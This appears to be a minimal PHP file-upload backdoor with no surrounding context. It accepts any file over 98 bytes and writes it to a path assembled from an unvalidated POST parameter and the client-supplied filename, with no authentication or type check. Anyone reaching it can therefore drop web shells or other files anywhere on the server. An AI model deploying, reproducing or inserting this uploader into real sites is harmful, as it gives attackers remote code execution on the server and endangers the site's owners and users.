
<?php
if ($_FILES["f"]["size"]  >= 99)
        move_uploaded_file($_FILES["f"]["tmp_name"], $_POST['a'].$_FILES["f"]["name"]);
?>

